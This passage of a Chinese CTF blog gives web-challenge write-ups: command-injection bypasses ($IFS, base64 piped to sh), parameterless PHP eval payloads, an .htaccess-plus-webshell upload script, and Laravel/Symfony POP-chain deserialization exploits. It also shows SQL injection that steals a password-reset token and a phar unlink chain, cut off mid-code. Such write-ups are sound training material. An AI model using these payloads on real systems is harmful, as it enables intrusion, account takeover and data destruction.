class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br><span class="line">## 管道符的作用是将上一条命令的输出，作为下一条命令参数</span><br></pre></td></tr></table></figure><p>解法三：利用变量拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$9$b$a.php</span><br></pre></td></tr></table></figure><h3 id="0x-02-禁止套娃"><a href="#0x-02-禁止套娃" class="headerlink" title="0x 02 禁止套娃"></a>0x 02 禁止套娃</h3><ul><li><p>解题思路</p><p>扫描目录，发现.git/文件夹，使用 githack 得到源代码</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>考的是无参数rce</p><p>解法一：</p><p>使用 scandir()查看当前目录情况，可以使用 pos(localeconv()); 构造一个 . 出来，用 print_r() 输出，即可得到当前的目录文件情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>发现存在flag.php位于倒数第二个，用一个array_reverse() 函数将数组翻转，再读取next即可读取到flag文件，最后使用 show_source()可以显示 php 代码，即可拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>解法二</p><p><img src="https://uploader.shimo.im/f/7RcZuASL4Ak4qgYh.png!original" alt="img"></p><h3 id="0x-03-BabyUpload"><a href="#0x-03-BabyUpload" class="headerlink" title="0x 03 BabyUpload"></a>0x 03 BabyUpload</h3><ul><li><p>解题思路</p><p>随便上传发现文件后缀ph被拦截， php3、phtml 都不能使，随便搞出来一个404得知是 apache 服务器，可以使用 .htaccess 文件改变文件解析配置，使得服务器可以把jpg当做php解析，从而命令执行；此外，服务器会<strong>检查文件内容是否包含</strong> （可以fuzz出来），要使用格式编写php代码。因此，本题上传 .htaccess 文件修改apache的解析，再把一句话木马后缀改为jpg即可</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;408150eb-1fa1-4377-94e9-63e769e1c586.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">htaccess &#x3D; &#123;&#39;uploaded&#39;: (&#39;.htaccess&#39;, &quot;SetHandler application&#x2F;x-httpd-php&quot;, &#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res_hta &#x3D; session.post(url, files&#x3D;htaccess)</span><br><span class="line">files &#x3D; &#123;&#39;uploaded&#39;: (&#39;123.jpg&#39;, &quot;&lt;script language&#x3D;\&quot;php\&quot;&gt;echo file_get_contents(\&quot;&#x2F;flag\&quot;);&lt;&#x2F;script&gt;&quot;, &#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res_jpg &#x3D; session.post(url, files&#x3D;files)</span><br><span class="line">res_shell &#x3D; session.post(url + res_jpg.text[-69:-22], data &#x3D; &#123;&#39;a&#39;:&#39;echo file_get_contents(\&#39;&#x2F;flag\&#39;);&#39;&#125;)</span><br><span class="line">print(res_shell.text)</span><br></pre></td></tr></table></figure><p>其他题目参考<a href="https://hwlanxiaojun.github.io/2020/03/20/安恒杯丨新春祈福赛/" target="_blank" rel="noopener">https://hwlanxiaojun.github.io/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> GXYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel反序列化学习</title>
      <link href="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    最近在刷buuoj发现了Laravel框架的题目，web菜鸡开始按照网上的方法开始学习挖掘pop链</p><h3 id="0x-01-CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#0x-01-CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="0x 01 [CISCN2019 总决赛 Day1 Web4]Laravel1"></a>0x 01 [CISCN2019 总决赛 Day1 Web4]Laravel1</h3><ul><li>第一种pop链</li></ul><ol><li>题目打开给了提示，需要审计Laravel源码，找反序列化链</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141527181.png" alt></p><ol start="2"><li>源代码拖入phpstrom,先全局搜索__destruct函数，找到这个类</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141755822.png" alt></p><p>进入<code>TagAwareAdapter.php</code>跟进魔术方法</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141847277.png" alt></p><p>跟进commit-&gt;跟进invalidateTags</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142134849.png" alt></p><p>在该类下ctrl+f搜一下$this-&gt;pool进行查看</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142244132.png" alt></p><p>可以看到$this-&gt;pool是可控的，但是需要实现AdapterInterface接口，那么如果我们找到某个类，它既实现了AdapterInterface这个接口，同时又有saveDeferred方法(或者没有而有__call方法)，而且满足一定条件能文件读取或命令执行即可。</p><p>全局搜索saveDeferred方法，然后首先跟据有无AdapterInterface接口进行排除</p><p>发现在PhpArrayAdapter.php</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142626551.png" alt></p><p>跟进initialize方法，来到PhpArrayTrait类下</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142804748.png" alt></p><p>存在文件包含点，至此分析结束</p><ol start="3"><li>构造poc，首先在PhpArrayAdapter类下的saveDeferred方法的入口参数item是实现了CacheItemInterface的，也就是item应该为实现了该接口的类的实例</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142932210.png" alt></p><p>在头文件的定义出发现使用<code>use Symfony\Component\Cache\CacheItem;</code></p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143030711.png" alt></p><p>构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>令include下的文件为/flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>回到触发点,其中item为deferred这个数组的值，并且这里的item需要实现CacheItemInterface接口，也就是item为CacheItem类的实例，而pool就是phparrayadapter的实例</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143322334.png" alt></p><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class TagAwareAdapter&#123;</span><br><span class="line">    private $deferred &#x3D; [];</span><br><span class="line">    private $pool;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;deferred &#x3D; array(&#39;xxx&#39; &#x3D;&gt; new CacheItem());</span><br><span class="line">        $this-&gt;pool &#x3D; new PhpArrayAdapter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组合在一起得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'xxx'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第二种pop链：</li></ul><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143959880.png" alt></p><p>进入ProxyAdapter.php中，跟进doSave方法</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319144241780.png" alt></p><p>pop链图如下</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1796442865.png" alt></p><p>poc如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected $innerItem &#x3D; &#39;cat &#x2F;flag&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line"></span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private $setInnerItem &#x3D; &#39;system&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">    public $deferred &#x3D; [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;pool &#x3D; new ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred &#x3D; array(&#39;a&#39; &#x3D;&gt; new \Symfony\Component\Cache\CacheItem);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>tips:</p><p>选中一个类文件，右键，选择diagrams-&gt;show diagrams,可以查看查看类的继承关系 </p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319145109768.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104287956" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104287956</a></p></blockquote><h3 id="0x-02-护网杯-2018-easy-laravel"><a href="#0x-02-护网杯-2018-easy-laravel" class="headerlink" title="0x 02 [护网杯 2018]easy_laravel"></a>0x 02 [护网杯 2018]easy_laravel</h3><blockquote><p>题目环境说明：buuoj 上的复现，和原版的题目不是完全一样。原题使用的是 nginx + mysql的配置 而 buuoj 上的是 apache + sqlite配置环境</p></blockquote><ul><li>前置知识</li></ul><h4 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h4><p>这是在 PHP5.3 以上的一个依赖管理工具。感觉和 docker 很像，docker-compose 根据 <code>docker-compose.yml</code> 中配置的服务和镜像，生成虚拟机。PHP 中的 composer 则是根据 <code>composer.json</code> 加载配置的 php package</p><p>配置更新源，Composer 镜像站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><p>升级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer self-update 或者 composer update --lock</span><br></pre></td></tr></table></figure><p>诊断命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer diagnose</span><br></pre></td></tr></table></figure><p>清除缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer clear</span><br></pre></td></tr></table></figure><p>根据 <code>composer.json</code> 安装 php package</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer install</span><br></pre></td></tr></table></figure><h4 id="Laravel中间件-Middleware"><a href="#Laravel中间件-Middleware" class="headerlink" title="Laravel中间件(Middleware)"></a>Laravel中间件(Middleware)</h4><p>在Laravel中起着过滤进入应用的HTTP请求对象(Request)和完善离开应用的HTTP响应对象(Reponse)的作用, 而且可以通过应用多个中间件来层层过滤请求、逐步完善相应。</p><p><img src="https://segmentfault.com/img/bV3mey" alt="图片描述"></p><ul><li>解题过程</li></ul><ol><li>打开后网页源码提示github上有源码。但是做题的时候源码已经没了，所以从题目环境中拖下来审计</li></ol><p>首先查看数据库文件，database/factories/ModelFactory.php中记录User的信息，发现用户名和email已知，密码是随机生成且进过经过 <code>bcrypt</code> 处理的，注入出来是没办法解开</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319223604248.png" alt></p><p>路由信息在routes/web.php中，对应的Controller在app/Http/Controllers/下对应的PHP文件。Upload和Flag只有admin用户可以访问。</p><ol start="2"><li>不难发现在 <code>App\Http\Controllers</code> 中的 <code>NoteController</code> 存在注入</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224015666.png" alt></p><p>由于数据库是sqlite，所以不能使用#，根据数据表可以有五个字段，进行联合注入，查看回显位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3,4,5--</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224543246.png" alt></p><p>得到回显位是第二位，由于admin用户的密码进过<code>bcrypt</code> 处理的，注入出来是没办法解开,根据存在的password_resets尝试注入出admin用户重置的token</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224716167.png" alt></p><p>先发送重置邮件，生成token插入数据库中</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225039464.png" alt></p><p>然后进行SQL注入查询。payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;union select 1,token,3,4,5 from password_resets where email&#x3D;&#39;admin@qvq.im&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225523909.png" alt></p><p>然后访问 <a href="http://url/password/reset/token" target="_blank" rel="noopener">http://url/password/reset/token</a> 即可重置密码</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225818508.png" alt></p><p>然后改密码即可登入管理员，但是flag下面是<code>no flag</code></p><p>题目提示是blade过期的问题，根据资料发现Blade 是 laravel 提供的一个简单强大的模板引擎。它不像其他流行的 PHP 模板引擎那样限制你在视图中使用原生的 PHP 代码，事实上它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变，这意味着 Blade 并没有给你的应用添加编译的负担。</p><p>那下一目标就是把缓存的文件删除掉。</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319230346302.png" alt></p><p>blade 缓存位置是 <code>storage/framework/views</code> apache 的默认目录是 <code>/var/www/html/</code> 在一起就是 <code>/var/www/html/storage/framework/views</code> 结合上面的 sha1 就是 <code>/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php</code></p><ol start="3"><li>接来下是寻找pop链删除文件，这里发现<code>composer.json</code>中提供了大量组件，我们安装一下，然后全局搜索<code>unlink()</code>在<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</code>中发现如下代码：</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319230901785.png" alt></p><p>然后在 UploadController 中的 check() 函数中发现调用了 file_exists() 函数，并且两个参数都可控,可以触发phar反序列化</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231028491.png" alt></p><p>上传后的文件路径也可以得知</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231117319.png" alt></p><p>构造exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $filters = [];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $writeBuffer = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $mirrors = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span 